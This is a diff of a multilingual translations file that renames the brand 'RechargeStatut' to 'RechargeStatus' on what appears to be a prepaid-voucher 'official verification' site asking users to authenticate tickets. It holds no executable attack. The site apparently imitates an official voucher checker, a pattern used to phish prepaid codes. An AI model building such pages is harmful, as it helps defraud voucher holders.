@@ -13,15 +13,15 @@ const translations = {
     form_oui: "Oui",
     form_non: "Non",
     form_envoyer: "Authentifier ",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Vérification des tickets prépayés.",
     footer_link_verify: "Vérifier",
     footer_link_faq: "FAQ",
     footer_link_contact: "Contact",
-    footer_copyright: "© 2026 RechargeStatut.com. Tous droits réservés."
+    footer_copyright: "© 2026 RechargeStatus.com. Tous droits réservés."
   },
   en: {
-    title: "RechargeStatut.com | Official Verification",
+    title: "RechargeStatus.com | Official Verification",
     nav_home: "Home",
     form_title: " Verification",
     form_nom: "Last Name:",
@@ -33,15 +33,15 @@ const translations = {
     form_oui: "Yes",
     form_non: "No",
     form_envoyer: "Authenticate ",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Prepaid  verification.",
     footer_link_verify: "Verify",
     footer_link_faq: "FAQ",
     footer_link_contact: "Contact",
-    footer_copyright: "© 2026 RechargeStatut.com. All rights reserved."
+    footer_copyright: "© 2026 RechargeStatus.com. All rights reserved."
   },
   es: {
-    title: "RechargeStatut.com | Verificación Oficial",
+    title: "RechargeStatus.com | Verificación Oficial",
     nav_home: "Inicio",
     form_title: "Verificación",
     form_nom: "Apellido:",
@@ -53,15 +53,15 @@ const translations = {
     form_oui: "Sí",
     form_non: "No",
     form_envoyer: "Autenticar ",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Verificación de cupones prepago.",
     footer_link_verify: "Verificar",
     footer_link_faq: "FAQ",
     footer_link_contact: "Contacto",
-    footer_copyright: "© 2026 RechargeStatut.com. Todos los derechos reservados."
+    footer_copyright: "© 2026 RechargeStatus.com. Todos los derechos reservados."
   },
   de: {
-    title: "RechargeStatut.com | Offizielle Prüfung",
+    title: "RechargeStatus.com | Offizielle Prüfung",
     nav_home: "Startseite",
     form_title: "Gutscheinprüfung",
     form_nom: "Nachname:",
@@ -73,15 +73,15 @@ const translations = {
     form_oui: "Ja",
     form_non: "Nein",
     form_envoyer: "Gutschein authentifizieren",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Prepaid-Gutscheinprüfung.",
     footer_link_verify: "Prüfen",
     footer_link_faq: "FAQ",
     footer_link_contact: "Kontakt",
-    footer_copyright: "© 2026 RechargeStatut.com. Alle Rechte vorbehalten."
+    footer_copyright: "© 2026 RechargeStatus.com. Alle Rechte vorbehalten."
   },
   it: {
-    title: "RechargeStatut.com | Verifica Ufficiale",
+    title: "RechargeStatus.com | Verifica Ufficiale",
     nav_home: "Home",
     form_title: "Verifica ",
     form_nom: "Cognome:",
@@ -93,15 +93,15 @@ const translations = {
     form_oui: "Sì",
     form_non: "No",
     form_envoyer: "Autentica ",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Verifica  prepagati.",
     footer_link_verify: "Verifica",
     footer_link_faq: "FAQ",
     footer_link_contact: "Contatto",
-    footer_copyright: "© 2026 RechargeStatut.com. Tutti i diritti riservati."
+    footer_copyright: "© 2026 RechargeStatus.com. Tutti i diritti riservati."
   },
   pt: {
-    title: "RechargeStatut.com | Verificação Oficial",
+    title: "RechargeStatus.com | Verificação Oficial",
     nav_home: "Início",
     form_title: "Verificação",
     form_nom: "Apelido:",
@@ -113,12 +113,12 @@ const translations = {
     form_oui: "Sim",
     form_non: "Não",
     form_envoyer: "Autenticar",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Verificação de cartões pré-pagos.",
     footer_link_verify: "Verificar",
     footer_link_faq: "FAQ",
     footer_link_contact: "Contacto",
-    footer_copyright: "© 2026 RechargeStatut.com. Todos os direitos reservados."
+    footer_copyright: "© 2026 RechargeStatus.com. Todos os direitos reservados."
 }
 };
 
